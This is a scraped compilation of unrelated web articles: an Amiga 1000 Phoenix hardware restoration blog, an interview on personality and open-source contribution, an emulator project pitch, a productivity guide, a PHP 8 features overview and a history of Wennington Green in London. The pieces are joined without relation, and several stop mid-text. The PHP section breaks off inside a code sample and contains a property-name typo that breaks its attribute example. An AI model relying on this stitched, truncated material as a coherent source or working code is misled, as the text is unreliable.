<p><em>You should mention or point out more clearly that the Phoenix Board is a … DIVA!<br>It is a hack. Just look at the manual what kind of things you can modify and what kind of headers there are to change stuff.<br>The price is that it has an extremely bad signal quality. Plus, it lacks the Buster-Chip that the Amiga 2000 has.<br>The Phoenix is a bad version of the original A2000 from Braunschweig, which in itself was a hacked and beefed-up version of the A1000.<br>Plus, the Phoenix only has two layers. It’s a nightmare as we have seen.</em></p>
<p>It simply always has some problems like stability and compatibility issues which I’ve tried to sort out.</p>
<p>Phoenix mobo was developed in 1989/1990 by our fellow friends from Australia and was one of the very first crowd-funding campaigns!

<h4>The plan</h4>
<p>Initially, MrTrinsic asked me to work on some external floppy replacements by Dell which I will cover in another post. Once I’ve figured out that floppy drive issue he’d decided we should start working on The Phoenix project.</p>
<p>At first, he’d send me a large box with gear that he wanted to have in this Amiga. I was like OMG! Not only Phoenix but the whole large project was about to begin!</p>
<p>The plan was to run lots of modern hardware add-ons with Amiga 1000 Phoenix and later try to squeeze it into a nice looking case, plus make it alive and stable.</p>
<p>The first package arrived and I was really excited by what I’ve seen.</p>
<p>Amiga 1000 Phoenix in an A1000 case with lots of mods and hacks already installed, plus, tons of other hardware mods still in boxes … and that was only for starters …</p>

<p>Obviously, the original plan was to MAKE Amiga 1000 Phoenix GREAT AGAIN!</p>
<p>Jokes aside, the main goal was to run a graphics card along with <a href="http://wiki.icomp.de/wiki/ACA500plus" target="_blank" rel="noreferrer noopener">ACA500plus</a> + <a href="http://wiki.icomp.de/wiki/ACA1233n" target="_blank" rel="noreferrer noopener">ACA1233n</a> accelerator card by iComp</p>
<p>On top of tons of other minor hardware mods, He’d also sent me two graphic cards – <a rel="noreferrer noopener" href="https://shop.mntmn.com/products/zz9000-for-amiga-preorder" target="_blank">ZZ9000 by MNT</a> and GBAPII++ by KryoFlux.</p>

<h4>Running it</h4>
<p>First things first. Phoenix motherboard is so rare that I first had to learn how it works and how it is all connected etc.</p>
<p>As it gave me a black screen at the very first run, I had to start learning about jumper settings and the board in general</p>
<p>Below, you can see a block diagram of particular parts location to give you an idea of what is where.</p>
<figure><img src="https://i0.wp.com/imgur.com/1Dz8Jbp.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/1Dz8Jbp.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>Of course, I would not move on quickly without MrTrinsics support. He’d pointed me to several sites and sent over some more info about the board itself. One of the most important documents I’ve received was <a rel="noreferrer noopener" href="https://retrohax.net/wp-content/uploads/2020/10/phoenix_jumpers_english.pdf" target="_blank">the jumper settings file</a> along with the <a rel="noreferrer noopener" href="https://retrohax.net/wp-content/uploads/2020/10/Phoenix.pdf" target="_blank">original manual</a>.</p>
<p>The above documents gave me the general idea of how things should work. The very first thing that I did was the removal of all added mods. I’ve then tried to run the A1K but still no luck – black screen. MrTrinsic then pointed me to jumper L35 which could cause such behavior if set incorrectly and bingo! It worked! </p>
<p>Since Phoenix has slots for more than one ROM chip, it is possible to install three KickStarts – 1.3. and 3.1 and third as a custom option. That was already done, along with a switch hack.</p>

<p>The problem was that Amiga wasn’t starting every single time. Instead, it booted every couple of times. My next move was to take it out and try running it outside of the case. This is where I’ve started noticing all the awesome texts on the PCB itself. I took PCB out started shooting pics of those texts and greetz for various hackers of that era.</p>

<p>Next, I’ve checked for any obvious problems and when I was happy with this inspection, I’ve put it back to a case to simply avoid any accidental short circuits caused by beer-drinking ;P</p>
<p>I’ve decided that I will try to run it with only Indivision ECS2, and KryoFlux GBAPII++ inserted.</p>
<p>I’ve then located the switch setting for the first ROM and put an awesome<a href="http://www.diagrom.com/" target="_blank" rel="noreferrer noopener"> DiagROM by John “<em>Chucky</em>” Hertell</a> in a socket. Yeah, I know, it is a quite a large resistor ;P</p>

<p>To my surprise, it worked flawlessly and I was greeted by a known diag info and a menu a bit later.</p>

<p>Once it worked, I’ve figured that it might be as simple as a flaky ROM socket problem. I’ve put a 2.0 ROM in the place of DiagROM and Viola! It works!</p>

<p>When I’ve figured that part out, I could move on and start working on the alternative power supply which was …</p>
<h4>HDPLEX + Uber nice Amiga adapter</h4>
<p>MrTrinsic sent me this HQ HDPLEX Pico PSU but he’d also sent me a very cool DIY KIT – ATX2.0d-Amiga adapter which has super cool features like over-voltage/current protection outputs all needed voltages, and has additional floppy power outputs. Moreover, it generates a TICK signal which is good to have for testing.</p>
<p>However, it was a DIY KIT so I had to solder it all up first.</p>

<p>Combined together, it created an awesome and stable power source for this Amiga project.</p>

<p>All I needed to do next was to prepare all the wiring. That was a trivial job after taking some measurements. I’ve used wires from my Nissan Patrol spare wiring kit as these are thick (copper) and nice, hence the color mismatch ;P</p>

<p>It worked like a charm so now I had two working power supplies – original and superior to it HDPLEX with a kickass adapter.</p>
<h4>030 cards</h4>
<p>The next step was about adding 68030 CPU to the system. I had two options as MrTrinsic sent me two different solutions.</p>
<p>The First solution was an <a rel="noreferrer noopener" href="https://icomp.de/shop-icomp/en/produkt-details/product/ACA500plus.html" target="_blank">ACA500plus</a> card along with <a rel="noreferrer noopener" href="http://wiki.icomp.de/wiki/ACA1233n" target="_blank">an ACA1233n</a> accelerator card by Individual Computers. ACA500plus also had an Ethernet add-on – X-Surf 500</p>
<p>These two make a great solution but for AMIGA 500. There are not many folks out there who played it with it in an A1000 and especially with a Phoenix mobo!</p>

<p>The first run was promising …</p>

<p>Then I’ve added ACA1233n on an EXTREMELY WANTED DURING PANDEMIC stand 😀 😀 😀</p>

<p>To my surprise, it worked!</p>
<figure><img src="https://i1.wp.com/imgur.com/GtUMP6a.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/imgur.com/GtUMP6a.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>

<p>Below, a demo running on this setup</p>
<figure><p><span><iframe width="900" height="507" src="https://www.youtube.com/embed/PJYyBRBnhu8?version=3&amp;rel=1&amp;fs=1&amp;autohide=2&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;wmode=transparent" allowfullscreen="true"></iframe></span>
</p></figure>
<p>The second setup was a bit different. It is made of four devices.</p>
<ul><li>Open 68000 relocator card</li><li>68030 accelerator card </li><li>SDRam + IDE interface</li><li>IDE2CF interface</li></ul>
<p>This setup also appeared to be working nicely after some tests, however as MrTrinsic pointed out, it has some stability issues and will not allow running some software so it was a backup card in case ACA failed. I don’t have a video of it running though.</p>

<h4>Other mods and add-ons</h4>
<p>Once accel-cards were tested, I’ve started installing OS and testing other mods. To name the few:</p>
<ul><li>X-surf 500 Ethernet card</li><li>RapidRoad USB</li><li>Indivision ECS v2</li><li>SCSI2SD </li><li>KryoFlux GBAPII++</li></ul>

<p>Indivision ECS v2 and SCSI2SD worked flawlessly so I started playing with other gear.</p>

<p>After installing all the needed software I’ve finally managed to get an IP addr from my local DHCP server</p>

<p>Obviously, I wouldn’t be myself if I didn’t destroy something. I’ve accidentally connected the RapidRoad USB module to a clock port the other way around. The magic smoke appeared and…</p>
<figure><img src="https://i0.wp.com/imgur.com/LHLR7WY.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/imgur.com/LHLR7WY.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
<p>Of course, I had to fix it. After a while, it turned out that only 3R3 resistor was fried.</p>

<p>I’ve quickly replaced it and started testing USB functionality.</p>

<h4>GFX cards</h4>
<p>Once all other major mods were working more or less correctly, I could start testing GFX cards high-res modes.</p>
<p>This is where it all started to go wrong …</p>
<p>I had two cards to test with this setup – GBAPII++ by Kryoflux and ZZ9000 by MNT. </p>
<p>GBAPII++ worked nicely only with green 030 cards, but in such config, there would be no Ethernet card.</p>

<p>Then I’ve tried running ZZ9000 along with green 030 and ACA cards but I’ve encountered autoconfig problems.</p>
<figure><img src="https://i2.wp.com/i.imgur.com/olqS18u.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/i.imgur.com/olqS18u.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>

<p>Finally, I’ve focused on ACA500plus with ACA1233n and I just couldn’t make it work. </p>
<p>When ACA was inserted then GBAPII++ was completely invisible to the system.</p>
<p>After updating tons of libraries, firmware and reinstalling OS a few times without any luck, we’ve figured out that it might be a power issue. MrTrinsic ordered an adapter for A500 which would allow pumping in more power.</p>
<p>I’ve first tested it with a stock A500.</p>
<figure><img src="https://i1.wp.com/i.imgur.com/AFRHzjv.png?w=900&amp;ssl=1" alt="" data-recalc-dims="1" data-lazy-src="https://i1.wp.com/i.imgur.com/AFRHzjv.png?w=900&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>

<p>Same story, GBAPII++ was invisible but I’ve checked it with A1K and power injector adapter just to be sure … unfortunately no luck again.</p>

<h4>Unfinished 🙁</h4>
<p>I’ve invested weeks of time into this GFX problem research but finally, I had to give up on this project for now. It is still in an unfinished state until we will find a solution to all problems. The project is partially done but it requires more work and I hope to cover it someday in one of the future posts making Amiga 1000 Phoenix great again!</p>
<p>But worry not, this gave birth to a new project which is even more awesome.</p>
<p>Currently, it is a work-in-progress but that is a story for another blog post 🙂</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section itemprop="text">
        
        <p>In September, <a href="https://twitter.com/esthershein">Ether Shein</a> interviewed me for an <a href="https://www.functionize.com/blog/how-personality-traits-affect-the-open-source-development-process/">article</a> she was writing for <a href="https://www.functionize.com/blog/">Functionize</a> about how personality affects the development process in open source projects. The article was inspired by a <a href="https://ieeexplore.ieee.org/abstract/document/8935389">study published in 2019</a> about the effects of personality traits on the acceptance of pull requests. Both the article and the study are worth a read.</p>

<p>What follows are my responses to the questions Esther sent.</p>

<h2 id="what-is-your-reaction-to-the-research-suggesting-that-a-developers-personality-has-an-impact-on-the-ability-to-successfully-contribute-to-an-open-source-project">What is your reaction to the research suggesting that a developer’s personality has an impact on the ability to successfully contribute to an open source project?</h2>

<p>What’s the adjective for “the furthest thing from surprised”? Because whatever that word is describes my reaction to this finding. While the research phrases it academically as “personality,” what they mean by that is someone’s ability to interact with others, the application of social interaction skills as well as technical skills.</p>

<p><em>Of course</em> social interaction is critical to a successful open source contribution, because it’s critical to <em>any</em> endeavour that involves more than one human being. Collaboration is difficult if not impossible when people aren’t able to interact well, whether due to personal skills, language differences, or some other obstruction. This is why we as humans spend so much time researching and discussing how to interact better: it affects everything we do as a civil society.</p>

<p>It’s also why so much of <a href="https://fossforge.com/">my book</a> ended up being about the social interactions involved with contributing to an open source project: it’s vital to the success of your contribution. We in open source have abundant documentation about the technical aspects of contributing, such as writing tests or the mechanics of sending your contribution for review. However, we have relatively little documentation about the social expectations for that contribution. Not that projects ignore the social expectations, of course; it’s simply that they rarely document them. Instead these expectations are a part of the tribal knowledge that a new contributor is expected to absorb. This can lead to a frustrating contribution experience. <a href="https://fossforge.com/">The book</a> collects these previously unwritten social rules of open source contributing in a single spot, giving people a better chance of success.</p>

<p>Which isn’t to diminish the importance of the findings of this research. These personality factors have a massive impact on the end result of an open source contribution, and this research has done a lot of work to prove that. Unfortunately, many people require that proof. They would rather throw a <code>[citation needed]</code> gauntlet on the table than make an effort to learn how to interact better with others. This research is the latest in a long line of responses to that gauntlet.</p>

<h2 id="should-maintainers-apply-personality-categorisation-methods-to-open-source-contributors">Should maintainers apply personality categorisation methods to open source contributors?</h2>

<blockquote>
  <p>People who are curious about where they score in the <a href="https://en.wikipedia.org/wiki/Big_Five_personality_traits">Big Five personality traits</a> can take the test at Open Psychometrics, while simultaneously (but optionally) contributing their results to ongoing research: <a href="http://openpsychometrics.org/">http://openpsychometrics.org</a></p>
</blockquote>

<p>As pointed out by the researchers, so far Big Five holds up to rigorous study. As such, it’s proven useful for broad sociological research such as this. Other personality type methodologies, such as the Myers-Briggs Type Indicator (MBTI), do not hold up to study and <a href="https://en.wikipedia.org/wiki/Myers%E2%80%93Briggs_Type_Indicator#Criticism">are considered problematic</a>.</p>

<p>Regardless of personality categorisation method, a category is not a judgement. For instance, scoring lower in the Neuroticism factor in Big Five simply means your emotional state is more variable <em>as compared with the others who took the test</em>. It’s a research label, not a diagnosis.</p>

<p>I believe it would be dangerous for individuals or projects to start incorporating this research into their contribution workflows at this time. It’s easy to picture some nightmare of a startup spinning up to “leverage AI, ML, and NLP to analyse your open source contributions and maximise the contributor-maintainer synergy, creating a more scaleable, sustainable, and delightful contribution experience” or <a href="https://strategy-madlibs.herokuapp.com/">some such rubbish</a>.</p>

<p>Yes, responding to and reviewing contributions can be time consuming, but applying generalisations intended for research to real-world situations typically <a href="https://twitter.com/justsaysinmice">causes more harm than good</a>. Please bury that terrible startup idea in a deep hole somewhere and pretend it never existed.</p>



<p>You can’t feasibly remove people from software development. Even if you go low-code or were to step into a sci-fi world and automate all code generation, you’re still creating software to solve problems for humans. Humans must be involved in the process somewhere, or it’s very unlikely that their needs will be met (in which case, why bother having the software at all?).</p>

<p>Right now code generation isn’t automated (for the most part); code is written by people. People creating software to solve problems for other people. With so many people in the mix, of course social interactions will have an outsized impact on the end result. Communication, conflict resolution, and empathy are key to successful social interactions. They’re important, and thankfully they’re learnable. You may never be perfect at—for instance—conflict resolution, but you can learn how to get better at it.</p>

<p>Therefore a practical takeaway from this research is that <strong>time spent learning how to improve your social interactions will have a larger return on investment for your career than the time spent improving your technical skills</strong>. Which isn’t to say that you should neglect your technical skills. This isn’t an either-or situation; it’s both-and. A software development career with technical but not social improvements is like a cake without the sugar: not very appealing.</p>

<p>Another important and practical takeaway from this research is the one that most people are overlooking: <strong>Having a diversity of social traits in an open source community leads to a better contribution experience.</strong> There’s plenty of research that supports this. <a href="https://hbr.org/2016/11/why-diverse-teams-are-smarter">Homogeneous teams consistently underperform those with diverse membership</a>. In this case, the researchers found that communities with diverse social and personality traits have more successful (i.e. merged) contributions. Therefore it follows that anything you can do to increase the human diversity in your open source project will also lead to more contributions.</p>

<p>That’s a powerful finding, and is possibly more important than the findings that are focused on the individual person submitting or reviewing a contribution.</p>

<p><img src="https://cdn.glitch.com/33ee6b19-10fa-4d51-8898-d35eb670b3fe%2Ftelemelt-FINAL.png?v=1601250432872" alt="Telemelt Logo"></p>
<p><a href="https://telemelt.com/">Telemelt</a> is a web-based multi-emulator (<a href="https://www.retroarch.com/">RetroArch</a>/<a href="https://www.libretro.com/">libretro</a>) designed to recreate the experience of playing console games with a single controller in a room full of friends.</p>
<p>Gathering around a TV and collectively attempting to beat a game has been a consistent joy throughout my life, and is one of the rituals I miss the most with the ones we're separated from right now. I wanted to create a way to play single player/hotseat games with friends remotely that was free and required minimal setup. Netplay has always been unsatisfying for this, since only the host had low enough latency for games that require tight timing. I started this project in March, and have been pouring my heart into it every day possible since then.<br>
<img src="https://cdn.glitch.com/33ee6b19-10fa-4d51-8898-d35eb670b3fe%2F6dfcbe63-2f80-4bb3-a780-a48a51dc0a19.image.png?v=1602011998888" alt="collage"></p>
<p>The system skips traditional netplay to allow a single player to assume host responsibility and experience <strong>zero network latency</strong> for games with demanding response times, with the viewers processing frames as broadcasted by the player. The virtual controller/host can be instantly passed to any user in the room.</p>
<p><strong>Designed to be lowest hassle way to play emulated games with a friend or loved one, even if they are not tech savvy!</strong></p>
<ul>
<li>No port forwarding, no IP addresses thanks to auto-generated URL</li>
<li>No installation or downloads, everything works in browser</li>
<li>Mappings for common/inexpensive controllers (PS3/4, XB360/1, Switch JC/Pro etc..) on both USB/BT thanks to RetroArch bindings</li>
<li>Always free! No tracking, no logins, no paid advertisements - personal budget allocated for Azure costs to serve thousands of users for months</li>
</ul>

<p><strong>Focus on the experience of passing <em>a single controller</em> between people</strong></p>
<ul>
<li>This allows for a unique and efficient architecture that provides a consistent experience with minimal bandwidth</li>
<li>No AV is transmitted! Only controller and serialized state data, made even smaller by <a href="https://github.com/phretaddin/schemapack">schemapack</a></li>
<li>User state error checked per frame and reconciled via <a href="http://socket.io/">socket.io</a> server if needed</li>
<li>Takes advantage of deterministic nature of certain libretro cores - like a broadcasted <a href="https://en.wikipedia.org/wiki/Tool-assisted_speedrun">TAS</a></li>
<li>Rethink the kinds of content you would play (painting, music collaboration, RPGs, game shows)</li>
<li>Everyone working towards the same goal keeps people engaged</li>
</ul>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://iuliangulea.com/images/productivity-cover.png" alt="Productivity cover"></p><h2 id="what-is-productivity">What Is Productivity?</h2><p>Let’s define productivity first:</p><blockquote><p>Productivity represents the efficiency of a person to perform a specific task.</p></blockquote><p>We often think it is a state of constant efficiency that allows us to do everything faster and better, but this is wrong. <em>Productivity is a measurement per individual task.</em> With some assignments, you are very productive, while with others, your efficiency is terrible.</p><p>It’s because, for some tasks, you unconsciously are doing the right things, while for the others, you need to rethink your approach. And this also means that you can focus on those more important tasks and become more efficient at them.</p><p>At the end of this guide, you will have all the necessary knowledge to analyze your approach toward different assignments and make the corresponding adjustments to be more productive. It helped me <a href="https://iuliangulea.com/faang-preparation/">land an offer at facebook</a> and become a part of <a href="https://www.toptal.com/resume/iulian-gulea">Toptal</a> — one of the best freelance communities on the planet, and I hope that it will help you, too.</p><h2 id="the-four-levels-of-mastery">The Four Levels Of Mastery</h2><p><img src="https://iuliangulea.com/images/the-pyramid-of-mastery/the-pyramid-of-mastery-1.png" alt="The Pyramid Of Mastery"></p><p>Before diving into different productivity techniques, let’s first dive into more details about the <em>essence</em> of productivity. And to do that, I will use the <a href="https://iuliangulea.com/pyramid-of-mastery/">Pyramid of Mastery</a> — a model that allows you to understand better a domain of interest, its constituent parts, and how to become an expert in it.</p><p>It does so by defining a domain through four types of entities:</p><ul><li><strong>Elements.</strong> These are the building blocks of the field of interest, that include concepts, ideas, and entities;</li><li><strong>Rules.</strong> These are the laws that govern a domain. This layer comprises both rules that define the interaction between various Elements as well as organizational and governing rules at the domain level;</li><li><strong>Tools.</strong> These are the instruments you use to perform the activities within a field;</li><li><strong>Frameworks.</strong> These are combinations of the above levels that allow for faster achievement of preset goals for which the Framework was created;</li></ul><p>For an in-depth explanation of the Pyramid of Mastery, you can read the original <a href="https://iuliangulea.com/pyramid-of-mastery/">article</a> on it.</p><p>Now, once you have an understanding of the model, let’s see how we can define productivity through the prism of it.</p><h2 id="productivity-elements">Productivity Elements</h2><p><img src="https://iuliangulea.com/images/the-pyramid-of-mastery/the-pyramid-elements.png" alt="Pyramid of Mastery - Elements"></p><p>What are the Elements of productivity, the building blocks that you need to know about in order to excel at it?</p><p>I find this to be the most underestimated and overlooked layer. Very few people are thinking about what makes a productive person or about what productivity consists of. Instead, they try to squeeze in more time using tools, calendars, and other tools.</p><p>But knowing the fundamentals is vital if you want to become an expert in something. Therefore, here are some of the Elements that can help you be more productive if you understand them.</p><h3 id="human-senses">Human Senses</h3><p>Our senses are the only mechanisms that allow us to get information about the world around us. Humans have five main senses through which they receive information:</p><ul><li>Vision</li><li>Hearing</li><li>Touch</li><li>Smell</li><li>Taste</li></ul><p>Each sense has its own throughput:</p><p><img src="https://iuliangulea.com/images/conscious_attention_bit_sec.png#c" alt="Image with conscious attention throughput"></p><p>Therefore, we receive the most information visually, then through hearing, touch, smell, and taste.</p><p>If you are interested in the topic of human senses, I wrote a separate, in-depth <a href="https://iuliangulea.com/human-senses/">article</a> about it.</p><h3 id="attention">Attention</h3><p>We receive a flood of information through our senses at every moment, but only a tiny bit of it reaches our awareness. This filter that orients our focus toward different stimuli is <strong>attention.</strong></p><p>Attention is the process that selects which sensory information is preferentially processed and ultimately reaches our awareness.<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup></p><p>There are two types of attention: <em>Goal-Directed</em> attention (GDA) and <em>Stimulus-Driven</em> attention (SDA). The GDA is the voluntary effort to focus on something, be it reading this article, cutting vegetables, watching a movie, or writing code.</p><p>On the other hand, SDA is the involuntary reaction toward stimuli that are salient enough to grab our attention:</p><ul><li>contrasting things (stillness to movement, loud to soft, silence to sound, dark to bright, etc.);</li><li>intensity stimulation (extreme sounds, sights, etc.);</li><li>certain impulses we find vital or appealing (dangerous things, beautiful things, shiny things, etc.);</li></ul><p>If you are interested in the topic of attention, I wrote a separate, in-depth <a href="https://iuliangulea.com/attention/">article</a> about it.</p><h3 id="working-memory">Working Memory</h3><p>For tasks that require cognitive effort, once we focused our attention on a specific subset of stimuli we got from our senses, it is only here that we can finally perform some mental work.</p><p>Working Memory is the place in our memory where we can consciously process and manipulate data. It has a fundamental limitation, though: its processing capacity is limited to ~4 chunks of information.</p><p>A <em>chunk</em> is a relative unit of measurement that depends on different factors, such as:</p><ul><li>familiarity with the topic;</li><li>complexity of the concept;</li><li>one’s mental agility;</li></ul><p>For instance, in the simple task of solving this simple math equation <code>21 * 2</code>, you have to store number <code>21</code> as a chunk, store number <code>2</code> as another chunk, then, having these 2 in your working memory, do the multiplication, and store the result <code>42</code> as a third chunk.</p><p>However, in a debate on “homeschooling vs. formal education,” both concepts each represent a chunk. As it is a complex concept, you can then zoom in or out on either of those as information is stored in a complex network of associations in our brain.</p><p>If you would like to learn more about working memory, I wrote a separate, in-depth <a href="https://iuliangulea.com/working-memory/">article</a> about it.</p><h3 id="long-term-memory">Long-Term Memory</h3><p>Our Long-Term Memory (LTM) holds all the information, knowledge, skills, plans, and memories. What you commit to the LTM can stay there for your whole life. Although there is a tendency to forget things, you can strengthen your memories using repetition.</p><h3 id="task-process">Task Process</h3><p>A task usually represents a specific result you want to achieve (e.g., write an article, build a website, create a marketing campaign, etc.). But behind any such assignment, there is a sequence of steps necessary to complete before you can say that you have done the task. It is called a <strong>process.</strong></p><p><img src="https://iuliangulea.com/images/task-process.png" alt="Image of a task process"></p><p>Each step in the process is a smaller task that will advance you closer to your desired result.</p><p>Learn and understand the necessary steps needed to achieve the end goal — it will show you what you are doing well and where you are wasting your time. Besides this, it is always easier to follow a list of specific action steps rather than figure out what to do on the fly.</p><h3 id="domain-specific-elements">Domain Specific Elements</h3><p>Finally, since productivity is measured per task, it means that besides the Elements mentioned above, there are some domain-specific ones that you must also understand to be more effective.</p><p>And this is valid for all layers of the pyramid — you must know your domain of activity. Otherwise, you cannot be productive in it since you will have to learn a lot, and learning is a slow and effortful process in itself.</p><p>Now, once we have enumerated the primary elements, let’s discuss the Rules that govern the domain of productivity.</p><h2 id="productivity-rules">Productivity Rules</h2><p><img src="https://iuliangulea.com/images/the-pyramid-of-mastery/the-pyramid-rules.png" alt="Pyramid of Mastery - Rules"></p><p>How the Elements we have enumerated interact? Here are some essential Rules that govern how we function and perform cognitive work.</p><h3 id="stimulus-driven-attention-overrides-goal-directed-attention">Stimulus-Driven Attention Overrides Goal-Directed Attention</h3><p>Imagine that while you are reading this article, you hear the sound of a breaking plate in the kitchen, which distracts you from reading. Or you are working on a report, and suddenly, the light starts to flash, thus distracting you from the job.</p><p>Stimulus-Driven attention can override your voluntary, Goal-Directed attention. This is bad news for productivity since, most of the time, working on a task means we have to engage this Goal-Directed attention to focus on some things consciously. And because those things might be boring, monotonous, or uninteresting, we can get distracted much easier by any unrelated stimulus.</p><p><img src="https://iuliangulea.com/images/bright-shiny-objects.jpg#c" alt="Cartoon where dogs in a meeting are being distracted by a squirrel"></p><p>The following stimuli are all capable of distracting your Goal-Directed Attention:</p><ul><li>high-contrast changes in our environment (stillness to movement, loud to soft, silence to sound, dark to bright, etc.);</li><li>intensity stimulation (extreme sounds, sights, etc.);</li><li>some certain impulses we find vital or appealing (dangerous things, beautiful things, shiny things, etc.);</li><li>“important” (e.g., one’s own name).</li></ul><h3 id="working-memory-is-physiologically-incapable-to-multitask">Working Memory Is Physiologically Incapable To Multitask</h3><p>Imagine you are in a warehouse with an immense storage capacity (that’s your Long-Term Memory), a single small table with four zones where any kind of work can be performed (that’s your Working Memory), and a storekeeper who does all the work and knows where everything is stored. One constraint is that the storekeeper can work <em>only</em> at the table, so you must first put it there before doing anything.</p><p><img src="https://iuliangulea.com/images/working-memory-analogy.png#c" alt="Image of a table with four zones and a storekeeper"></p><p>Each chunk takes one slot on the table. And you can get it either from your senses (imagine a conveyor system that brings things directly to your table) or search in the warehouse (which takes time).</p><p>Suppose you are working on a report. The storekeeper searches for relevant information in your Long-Term memory, puts it on the table, takes some from the conveyor, and puts it on the table as well, where they can manipulate, combine, dissect, and mix those concepts.</p><p>But suddenly, you are being called by your spouse regarding the plans for the weekend. Ideally, the storekeeper should take the time to carefully take the chunks off the table and put them in a dedicated place where they can find them later. In reality, however, the storekeeper sweeps off in a hurry everything from the table and rushes to put on it chunks related to plans for the weekend: movies, cuisine, activities, etc.</p><p>Then, when you are done talking with your spouse, you stare blankly at the computer screen, trying to recall what you were doing before the call. The storekeeper runs hysterically around the table in these moments, trying to find out something, but they don’t know what exactly to look for. Finally, you see the opened MS Excel window and remember you were working on the report.</p><p>But then another problem arises. You cannot recall the latest thoughts you had just before the call. The storekeeper cannot find the chunks they swept off the table. They looked everywhere, but the chunks just vanished. And …</p></div></div>

<blockquote>
<p>Weak maps allow creating a map from objects to arbitrary values (similar to SplObjectStorage) without preventing the objects that are used as keys from being garbage collected. If an object key is garbage collected, it will simply be removed from the map.</p>
</blockquote>
<p>This is a very useful new feature, as it allows users to worry even less about leaving memory leaks in their code. While this might not be an issue for most PHP developers, it is certainly something to watch out for when writing long-running processes, for example using ReactPHP. With WeakMaps, references to an object automatically get garbage collected, once the object is no longer available.</p>
<p>If you would do the same thing with an array, you would still have a reference to the object, thus leaking memory.</p>

<p>PHP 8's attributes actually consist of a number of RFCs:</p>
<ul>
<li>RFC: <a href="https://wiki.php.net/rfc/attributes_v2">https://wiki.php.net/rfc/attributes_v2</a>
</li>
<li>RFC: <a href="https://wiki.php.net/rfc/attribute_amendments">https://wiki.php.net/rfc/attribute_amendments</a>

<li>RFC: <a href="https://wiki.php.net/rfc/shorter_attribute_syntax_change">https://wiki.php.net/rfc/shorter_attribute_syntax_change</a>
</li>
</ul>
<p>Attributes are definitely one of the biggest changes in PHP 8, and they can be a bit tricky to understand at first. In short, attributes allow you to add meta-data to PHP functions, parameters, classes, etc.
This meta-data can then be retrieved programatically - whereas in PHP 7 and lower, you would need to parse doclocks, attributes allow you to access this information deeply integrated into PHP itself.</p>
<p>To make this a bit clearer, lets say that you want to allow users to add a middleware to a controller class/method by using an attribute.</p>
<pre data-theme="light" data-filename="index.php" data-php="8"><pre data-filename="index.php">&lt;?php
declare(strict_types=1);
// First, we need to define the attribute. An Attribute itself is just a plain PHP class, that is annotated as an Attribute itself.

#[Attribute]
class ApplyMiddleware
{
    public array $middlware = [];

    public function __construct(...$middleware) {
        $this-&gt;middleware = $middleware;
    }
}

// This adds the attribute to the MyController class, with the "auth" middleware as an argument.

#[ApplyMiddleware('auth')]
class MyController
{
    public function index() {}
}

// We can then retrieve all ApplyMiddleware attributes on our class using reflection
// And read the given middleware arguments.

$reflectionClass = new ReflectionClass(MyController::class);

$attributes = $reflectionClass-&gt;getAttributes(ApplyMiddleware::class);

foreach ($attributes as $attribute) {
    $middlewareAttribute = $attribute-&gt;newInstance();
    dump($middlewareAttribute-&gt;middleware);
}

exit;
</pre>
</pre>

<p>This RFC proposes to introduce a short hand syntax, which allows combining the definition of properties and the constructor:</p>
<pre data-theme="light" data-filename="index.php" data-php="8"><pre data-filename="index.php">&lt;?php
declare(strict_types=1);

class User {
    public function __construct(
        public int $id,

<h2>Wennington Green, Bow, London</h2>



<p>At the intersection of Roman Road and Grove Road lies Wennington Green – a patch of land in <a href="https://romanroadlondon.com/mile-end-park-history/" target="_blank" rel="noreferrer noopener">Mile End Park </a>principally sculpted by flying bombs. In fact, an English Heritage plaque on the railway bridge a little further down Grove Road commemorates the first one to strike London.</p>



<p>The blitz largely levelled the hundred or so turn-of-the-century terraces, common stock of the working class East End, on what is now the Green but up until the early ‘90s a row of dilapidated dwellings persisted. These residences were mostly derelict, abandoned and occasionally squatted, but for one, ex-docker Mr Sidney Gale of No. 193, a condemned house remained a home.</p>



<p>Indeed, in 1993, the final row was fated to be demolished as part of Tower Hamlet’s council’s plan to create a Green Corridor, unifying the broken line of parkland between the Isle of Dogs and the established lung of <a href="https://romanroadlondon.com/victoria-park-east-london-bow/">Victoria Park</a>. It was a means to cleanse the area of the legacy of prefabs that had homed the dislocated population post-war and a redemptive space for those in the high-rise accommodation which had replaced the traditional terraces. ‘What people who live in tower blocks want is parkland,’ declared Councillor Eric Flounders.</p>



<p>Yet psychogeographer Iain Sinclair was sceptical of the council’s motives, calling it ‘an Arcadia for the underclass… the whole scheme was a disinterested attempt at municipal aesthetics’. Pointedly, the area was in direct sight of Mrs Thatcher’s commerce baby, Canary Wharf, and the call for a Green was not a far cry from the original motivations to create Victoria Park, opened in 1845. Vicky Park is the oldest purpose built recreation ground in London, conceived to curb disease contracted in damp and cramped conditions and as a means harness working-class wildness. Indeed, Bow is an area rich with connotations of a strong working-class community, but also radicalism and revolt.</p>



